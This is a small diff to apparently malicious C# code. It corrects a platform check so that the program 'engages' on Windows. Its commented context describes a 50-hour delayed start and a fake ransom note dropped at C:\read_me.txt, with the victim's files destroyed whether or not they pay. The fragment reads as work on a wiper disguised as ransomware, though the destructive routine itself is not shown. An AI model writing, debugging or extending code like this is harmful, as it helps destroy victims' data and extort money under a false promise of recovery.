@@ -17,7 +17,7 @@ namespace Main
             {
                 Environment.Exit(0);
             }
-            else if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) //if windows is found. engage
+            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) //if windows is found. engage
             {
                 //System.Threading.Thread.Sleep(180000000); //waits 50 hours before executing main class. optional.
                 //FileStream fs = new FileStream(@"C:\read_me.txt", FileMode.OpenOrCreate, FileAccess.Write); //small note that will act as a fake ransomware note. asking for money. no payment = files gone. it will happen anyway even if they pay or not.
